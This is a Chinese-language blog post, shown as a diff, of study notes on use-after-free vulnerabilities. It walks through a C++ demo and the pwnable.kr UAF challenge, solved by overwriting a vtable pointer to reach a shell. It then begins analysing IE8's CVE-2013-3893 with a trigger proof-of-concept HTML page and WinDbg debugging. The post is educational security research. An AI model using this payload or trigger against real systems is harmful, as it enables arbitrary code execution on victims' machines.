@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    IE8的一个释放后重用(UAF) |
+    
+    Migraine</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-浏览器UAF" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      IE8的一个释放后重用(UAF)
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/" class="article-date">
+  <time datetime="2019-11-06T16:15:29.000Z" itemprop="datePublished">2019-11-07</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Win%E6%BC%8F%E6%B4%9E/">Win漏洞</a> / <a class="article-category-link" href="/categories/Win%E6%BC%8F%E6%B4%9E/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>摘要：浏览器下UAF漏洞的学习笔记。</p>
+<p>关键词：</p>
+<p>UAF</p>
+<p>精确堆喷射</p>
+<p>ROP、DEP</p>
+<p>目录：</p>
+<blockquote>
+<p>0x01通过一道PWN题理解UAF</p>
+</blockquote>
+<p>​        UAF基础概念</p>
+<p>​        PWN题</p>
+<blockquote>
+<p>0x02 IE的UAF漏洞实例分析（CVE-2013-3893）</p>
+</blockquote>
+<p>​        UAF漏洞利用</p>
+<p>​        精确堆喷射结合ROP</p>
+<blockquote>
+<p>附录</p>
+</blockquote>
+ <a id="more"></a>
+
+
+
+<h1 id="0x01通过一道PWN题理解UAF"><a href="#0x01通过一道PWN题理解UAF" class="headerlink" title="0x01通过一道PWN题理解UAF"></a>0x01通过一道PWN题理解UAF</h1><h2 id="1-1UAF基础概念"><a href="#1-1UAF基础概念" class="headerlink" title="1.1UAF基础概念"></a>1.1UAF基础概念</h2><p>UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p>
+<p>在了解UAF是导致任意代码执行的细节，首先让我们了解几个概念：</p>
+<p>悬挂指针、内存占坑、C++虚函数</p>
+<p>实验源码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; UAFv1.cpp : 定义控制台应用程序的入口点。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#define size 32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Base</span><br><span class="line">&#123;</span><br><span class="line">public :</span><br><span class="line">	int base;</span><br><span class="line">	virtual void f()&#123; cout&lt;&lt;&quot;Base::f()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">	virtual void g()&#123;cout&lt;&lt;&quot;Base::g()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">	virtual void h()&#123;cout&lt;&lt;&quot;Base::h()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Child:public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">	int child;</span><br><span class="line">	void f()&#123;cout&lt;&lt;&quot;Child::f()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">	void g1()&#123;cout&lt;&lt;&quot;Child::g1()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">	void h1()&#123;cout&lt;&lt;&quot;Child::h1()&quot;&lt;&lt;endl;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char *buf1;</span><br><span class="line">	char * buf2;</span><br><span class="line">	&#x2F;&#x2F;Lab1</span><br><span class="line">	buf1&#x3D;(char *)malloc(size);</span><br><span class="line">	printf(&quot;buf1:0x%p\n&quot;,buf1);</span><br><span class="line">	free(buf1);</span><br><span class="line"></span><br><span class="line">	buf2&#x3D;(char *)malloc(size);</span><br><span class="line">	printf(&quot;buf2:0x%p\n&quot;,buf2);</span><br><span class="line"></span><br><span class="line">	memset(buf2,0,size);</span><br><span class="line">	printf(&quot;buf2:%d\n&quot;,*buf2);</span><br><span class="line"></span><br><span class="line">	printf(&quot;&#x3D;&#x3D;&#x3D;&#x3D;Use Afrer Free&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);</span><br><span class="line">	strncpy(buf1,&quot;hack&quot;,5);</span><br><span class="line">	printf(&quot;buf2:%s\n\n&quot;,buf2);</span><br><span class="line"></span><br><span class="line">	free(buf2);</span><br><span class="line">	&#x2F;&#x2F;Lab2</span><br><span class="line">	Base *B&#x3D;new Base();</span><br><span class="line">	Base *C&#x3D;new Child();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.ax1x.com/2019/11/07/MA1z9S.png" alt=""></p>
+<h3 id="1-1-1悬挂指针-Dangling-pointer"><a href="#1-1-1悬挂指针-Dangling-pointer" class="headerlink" title="1.1.1悬挂指针(Dangling pointer)"></a>1.1.1悬挂指针(Dangling pointer)</h3><p>指向被释放的对象内存的指针。</p>
+<p>成因：释放掉后没有将指针重置为null，导致指针依旧可以访问，并且继续指向已经释放的内存.UAF便是调用悬挂指针（多为C++对象），通过对这段内存提前的设计，使得程序调用我们设计好的程序。</p>
+<p>案例程序中，为buf1分配了一段32字节的空间，然后将其释放。</p>
+<p>但是当使用strncpy对已经释放的buf1拷贝字符串时，发现被free的buf1依然是可以访问的，并且指向的内存没有变化。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA1XAP.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA1T6H.png" alt=""></p>
+<p>释放后的buf1依然指向原来的内存，此时的buf1就是一个悬挂指针。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA1bnA.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA1htK.png" alt=""></p>
+<h3 id="1-1-2占坑"><a href="#1-1-2占坑" class="headerlink" title="1.1.2占坑"></a>1.1.2占坑</h3><p>了解堆分配的占坑机制，需要了解SLUB系统内存分配机制。和SLAB不同，这种利用方法对对象类型没有限制，两个对象只要大小差不多就可以重用同一块内存，也就是说我们释放掉对象A以后马上再申请对象B，只要两者大小相同，那么B就很有可能重用A的内存。</p>
+<p>见案例中，释放buf1时，buf1指向0xa35470的内存。而在buf1释放之后，立即分配一个相同大小的内存给buf2指针，发现buf2获取的指针指向的就是buf1被释放的内存地址。</p>
+<p>这就是buf2占坑了buf1的内存空间。</p>
+<p>此时发散一下思维，buf2可控，而buf1仍然指向buf2的内存空间，是不是就有可能造成程序出现问题。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA39Xj.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA1htK.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA3VhT.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA3m3F.png" alt=""></p>
+<h3 id="1-1-3虚函数"><a href="#1-1-3虚函数" class="headerlink" title="1.1.3虚函数"></a>1.1.3虚函数</h3><p>C++中的虚函数的作用主要是实现了多态的机制。简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”。代码表现形式就是C++类中Virtaul开头的函数。</p>
+<p>同时C++的虚函数是漏洞攻击的重点对象，C++对象中有一个非常重要的结构–虚函数表。</p>
+<p>覆盖C++虚函数造成的漏洞利用技术的风靡程度，不亚于经典栈溢出的覆盖手法。更重要的是覆盖虚函数表还可以从本质上绕过GS等内存保护机制，这里不展开说了。</p>
+<p>详细的逆向分析，非常推荐《C++反汇编揭秘》这本书，将虚函数的反汇编代码和C++代码进行对比，理解会比较深刻。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3Mu9.png" alt=""></p>
+<p>代码分别实例化了Base和Child为B和C，查看内存结构。</p>
+<p>Base对象B的首地址存放_vfptr(虚函数表)，指向三个虚函数f()、g()、 h() </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA33Ax.png" alt=""></p>
+<p>Child对象C的首地址是对基类（Base）的一个拷贝，值得注意的是Base类里的虚函数表，这里的f()函数被Child重写，g和h函数则依然指向Base实例化时其在虚函数表中的地址。</p>
+<p>C的第二个地址则指向自己的虚函数表。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3Nge.png" alt=""></p>
+<p>这些继承关系，可以简单概括为下面三张图。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3G4K.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA3wDA.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA3rUP.png" alt=""></p>
+<p>接下来我们观察代码是如何生成C++虚函数表的。</p>
+<p>首先v2=operator new(8u) 对应Base *B=new Base()实例化对象，v2为指向对象的指针。</p>
+<p>实例化对象之后，C++会将虚函数表的地址放在对象内存的开头。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3ggg.png" alt=""></p>
+<p>进入sub_411140函数之后经过二次跳转进入sub_4117A0函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text:004117C3                 mov     eax, [ebp+var_8]</span><br><span class="line"></span><br><span class="line">.text:004117C6                 mov     dword ptr [eax], offset ??_7Base@@6B@ ; const Base::&#96;vftable&#39;</span><br></pre></td></tr></table></figure>
+<p>mov操作将虚函数表地址放到[eax]的位置，而此时eax的值就是通过上层函数传递下来的v2的指针。所以这段代码就完成了将虚表放置到对象头部的效果。</p>
+<p>这一步骤之后，也就能理解为什么虚函数表会在对象表头，同时这个操作也是我们用来判断C++对象创建的一个非常好的信号，还可以获取这个对象的头部地址和虚表。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3fDs.png" alt=""></p>
+<h2 id="1-2通过PWN题掌握UAF"><a href="#1-2通过PWN题掌握UAF" class="headerlink" title="1.2通过PWN题掌握UAF"></a>1.2通过PWN题掌握UAF</h2><p>在掌握了基础之后，我们可以拿pwnalbe.kr 的UAF题来快速理解利用原理。</p>
+<p>使用scp下载二进制文件和源码（密码:guest）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ scp -P2222 uaf@pwnable.kr:&#x2F;home&#x2F;uaf&#x2F;uaf  &#x2F;Users&#x2F;p0kerface&#x2F;</span><br><span class="line"></span><br><span class="line">$ scp -P2222 uaf@pwnable.kr:&#x2F;home&#x2F;uaf&#x2F;uaf.cpp  &#x2F;Users&#x2F;p0kerface&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<p>主要思路便是利用占坑的方法，向被释放的空间写入数据覆盖vfptr（虚函数表），然后调用悬挂指针完成UAF，这题非常经典值得在做UAF之前的复习。</p>
+<p>调试过程中，意识到自己阅读C++的反汇编水平还是不够，类和对象没有源码只看IDA还是非常困难的。所以会把一些逆向的笔记记录下来。</p>
+<p>程序源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">uaf.cpp</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;iostream&gt; </span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Human&#123;</span><br><span class="line">private:</span><br><span class="line">​	virtual void give_shell()&#123;</span><br><span class="line">​		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">protected:</span><br><span class="line">​	int age;</span><br><span class="line">​	string name;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">​	virtual void introduce()&#123;</span><br><span class="line">​		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">​		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">class Man: public Human&#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">​	Man(string name, int age)&#123;</span><br><span class="line">​		this-&gt;name &#x3D; name;</span><br><span class="line">​		this-&gt;age &#x3D; age;</span><br><span class="line">​        &#125;</span><br><span class="line">​        virtual void introduce()&#123;</span><br><span class="line">​		Human::introduce();</span><br><span class="line">​                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">class Woman: public Human&#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">​        Woman(string name, int age)&#123;</span><br><span class="line">​                this-&gt;name &#x3D; name;</span><br><span class="line">​                this-&gt;age &#x3D; age;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        virtual void introduce()&#123;</span><br><span class="line">​                Human::introduce();</span><br><span class="line">​                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">​	Human* m &#x3D; new Man(&quot;Jack&quot;, 25);</span><br><span class="line">​	Human* w &#x3D; new Woman(&quot;Jill&quot;, 21);</span><br><span class="line"></span><br><span class="line">​	size_t len;</span><br><span class="line">​	char* data;</span><br><span class="line">​	unsigned int op;</span><br><span class="line">​	while(1)&#123;</span><br><span class="line">​		cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;</span><br><span class="line">​		cin &gt;&gt; op;</span><br><span class="line">​		switch(op)&#123;</span><br><span class="line">​			case 1:</span><br><span class="line">​				m-&gt;introduce();</span><br><span class="line">​				w-&gt;introduce();</span><br><span class="line">​				break;</span><br><span class="line">​			case 2:</span><br><span class="line">​				len &#x3D; atoi(argv[1]);</span><br><span class="line">​				data &#x3D; new char[len];</span><br><span class="line">​				read(open(argv[2], O_RDONLY), data, len);</span><br><span class="line">​				cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;</span><br><span class="line">​				break;</span><br><span class="line">​			case 3:</span><br><span class="line">​				delete m;</span><br><span class="line">​				delete w;</span><br><span class="line">​				break;</span><br><span class="line">​			default:</span><br><span class="line">​				break;</span><br><span class="line">​		&#125;</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">​	return 0;	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-1代码分析"><a href="#1-2-1代码分析" class="headerlink" title="1.2.1代码分析"></a>1.2.1代码分析</h3><p>通过IDA反汇编，不过C++的代码已经非常难以看懂了，代码主要分两大块解析。</p>
+<p>第一部分是类和子类的定义，定义的父类Human和子类Man和Woman。其中父类包含get_shell函数，虽然子类并没有定义，但是通过继承关系可知，在实例化过程中，虚函数表中函数会包含这个函数。</p>
+<p>第二部分就是类的实例化和use after free 三个功能。</p>
+<p>接下来我们将程序重要的部分分析一下，以便理解漏洞。</p>
+<p>（1）实例化对象</p>
+<p>Human* m = new Man(“Jack”, 25);这句在IDA翻译如下，变量v3为实例化Man对象之后的指针。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA3IU0.png" alt=""></p>
+<p>找到对应的反汇编，0x400F13这个地方是对象实例化的函数，在call执行结束之后，EBX中便保存这Man对象的指针，即上文中的v3变量。可以通过gdb下断点进行调试。</p>
+<p>当实例完对象之后，ebx存放的地址（0x401570），也就是前文中所说的虚函数表vfptr，指向的第一个函数Human继承下来的give_shell。  </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA37CT.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA3OKJ.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA3jbR.png" alt=""></p>
+<p>让我们查看虚表的内存，可以看到Man的虚表中有两个函数。虚表偏移8字节便是introduce函数。 <img src="https://s2.ax1x.com/2019/11/07/MA8C8O.png" alt=""></p>
+<p>（2）调用方法</p>
+<p>源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">case 1:</span><br><span class="line">​				m-&gt;introduce();</span><br><span class="line">​				w-&gt;introduce();</span><br><span class="line">​				break;</span><br></pre></td></tr></table></figure>
+<p>IDA中对应的伪代码</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA8ixe.png" alt=""></p>
+<p>指针v13和v14分别对应实例化的Man和Woman，Woman的虚函数表的结构与Man是相同的（地址不同），所以不再赘述。</p>
+<p>通过观察虚函数表结构，我们已经知道introduce为虚表表头偏移8个字节，所以便有了v13+8字节偏移。</p>
+<p>这里就埋下一个伏笔，如果对虚表指针的地址进行改写，将虚表向前偏移8个字节，这样本来调用introduce方法就会调用getshell方法。</p>
+<p>对应的反汇编如下，非常建议自己动态调试一遍，能够加深印象。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA8ZVI.png" alt=""></p>
+<h3 id="1-2-2UAF利用流程"><a href="#1-2-2UAF利用流程" class="headerlink" title="1.2.2UAF利用流程"></a>1.2.2UAF利用流程</h3><p>（1）程序实例化Man和Women</p>
+<p>（2）使用Free将Man和Women分别Free （free）</p>
+<p>（3）再分配内存，这里我们需要分配24字节，为了占坑。（after） </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA8mIP.png" alt=""><br>因为24字节（0x18）和之前分配的Man和Women一样（上图所示），所以会发生占坑现象，也就是说程序会将之前被释放的Man和Women空间分配给这个指针。此时读取文件（poc）的内容，因为占坑之后内存指针指向的第一个字符就是，覆盖之前Man和Women的虚函数。</p>
+<p>Poc的内容就是$ python -c “print ‘\x68\x15\x40\x00\x00\x00\x00\x00’”&gt; poc </p>
+<p>即0x401468=0x401570-8，原虚函数表地址-8字节。</p>
+<p>（4）调用Man的悬挂指针，因为虚函数表被我们从poc读入的数据改写，调用intruduce会调用getshell</p>
+<p>（5）利用结束</p>
+<p>使用UAF修改C++虚表，改变程序流程。</p>
+<p>调试过程中，建议下如下的断点，可以让程序停在关键的地方。也可以在调试过程中，多尝试用Ctrl+C呼叫程序暂停，然后设置断点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x400f13</span><br><span class="line">Breakpoint 1 at 0x400f13</span><br><span class="line">gdb-peda$ b *0x400fcd</span><br><span class="line">Breakpoint 2 at 0x400fcd</span><br><span class="line">gdb-peda$ b *0x40102d</span><br><span class="line">Breakpoint 3 at 0x40102d</span><br><span class="line">gdb-peda$ b *0x401076</span><br><span class="line">Breakpoint 4 at 0x401076</span><br></pre></td></tr></table></figure>
+
+<p>根据如下的操作，我们很容易就获取了shell，注意传递参数poc文件</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA8MRS.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA88qs.png" alt=""> </p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>UAF在浏览器漏洞中多为对C++对象（虚函数）的修改，悬挂指针是UAF利用的关键，调用被Free的函数，如果这个函数的位置已经被别的对象占坑，进行了修改，那么调用悬挂指针就可能能够造成任意代码执行。结合Heap Spray会产生很好的效果。</p>
+<h1 id="0x02-IE浏览器UAF漏洞"><a href="#0x02-IE浏览器UAF漏洞" class="headerlink" title="0x02 IE浏览器UAF漏洞"></a>0x02 IE浏览器UAF漏洞</h1><p>调试环境：</p>
+<p>Windows 7 SP1</p>
+<p>IE8</p>
+<p>漏洞编号:CVE-2013-3893</p>
+<p>该漏洞是的原理是，IE下的mshtml动态连接库将TreeNode对象从Dom树释放后，又重新调用对象的任意代码执行。是一个典型的浏览器UAF漏洞，最后使用精准堆喷射完成利用。</p>
+<p>因为本文作者调试实例漏洞的功底有限，所以会漏洞如何发现以及利用部分，漏洞的原理和挖掘的讲解可能达不到高水平读者的要求，希望读者能谅解。</p>
+<h2 id="2-1漏洞分析"><a href="#2-1漏洞分析" class="headerlink" title="2.1漏洞分析"></a>2.1漏洞分析</h2><p>可以通过msf/exploit-db获取这个漏洞的POC，我们对其进行一些修改，方便我们的分析。</p>
+<p>调试的poc代码如下</p>
+<p>POC.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​		function trigger()</span><br><span class="line">​		&#123;</span><br><span class="line">​			Math.tan(2,1);</span><br><span class="line">​			var father&#x3D;document.createElement(&quot;father&quot;);</span><br><span class="line">​			var child&#x3D;document.createElement(&quot;child&quot;);</span><br><span class="line">​			Math.tan(1,2);</span><br><span class="line">​			document.body.appendChild(father);</span><br><span class="line">​			document.body.appendChild(child);</span><br><span class="line">​			Math.sin(1,2);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture&#x3D;function() &#123;</span><br><span class="line">​				document.write(&quot;&quot;);</span><br><span class="line">​				&#x2F;&#x2F;alert(&quot;123&quot;);</span><br><span class="line">​			&#125;</span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father[&#39;outerText&#39;]&#x3D;&quot;&quot;;</span><br><span class="line">			Math.cos(1,2);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line">​		&#125;</span><br><span class="line">​		window.setTimeout(&quot;trigger()&quot;,1000);</span><br><span class="line"></span><br><span class="line">​	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-1-基于POC的流程分析"><a href="#2-1-1-基于POC的流程分析" class="headerlink" title="2.1.1 基于POC的流程分析"></a>2.1.1 基于POC的流程分析</h3><p>首先要清楚POC的运行流程，通过createElement创建两个对象father和child</p>
+<p>接着为两个对象分别创建两个结点。效果如图所示，<body>标签下创建了<father>和<child>标签。同时也会创建一个TreeNode对象。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAyHTf.png" alt=""></p>
+<p>将child作为father的子结点</p>
+<p>father[‘outerText’]=””将元素本身赋值为空对象，这句会导致DOM树中所有father的子孙结点都被析构（fahter、child）也就是说TreeNode会从DOM上脱离。</p>
+<p>father.setCapture();child.setCapture();father鼠标指针聚焦，child鼠标指针聚焦，导致father失焦，会触发father.onlosecapture=function()</p>
+<p>document.write(“”);</p>
+<p>漏洞触发的位置</p>
+<p>在调用document.write(“”);时候，释放了TreeNode对象，但是在程序之后运行的函数中，使用了这个被释放的对象，导致了释放后重用漏洞。</p>
+<p>POC调试</p>
+<p>程序断点在了CTreeNode::GetInterface函数，call ecx指向的地址。</p>
+<p>使用kv可以追踪函数的流程。按照这样的回溯也是可以分析漏洞的。不过为了更精确地找到造成中断的根源，我们开启页堆（page heap），这样程序在遇到堆结构被破坏时会更即使地断下。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAyOfg.png" alt=""></p>
+<p>使用Windbg的Global Flags工具开启page heap（页堆），选择Enable page heap选项。</p>
+<p>不建议开启左下角的Enable heap tagging，会导致后面调试经常出问题。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAyjpQ.png" alt=""></p>
+<p>再次运行POC，程序断点在了HasContainerCapture+0x14的位置。根据栈回溯，可以发现比之前的断点位置更靠前了一些。 </p>
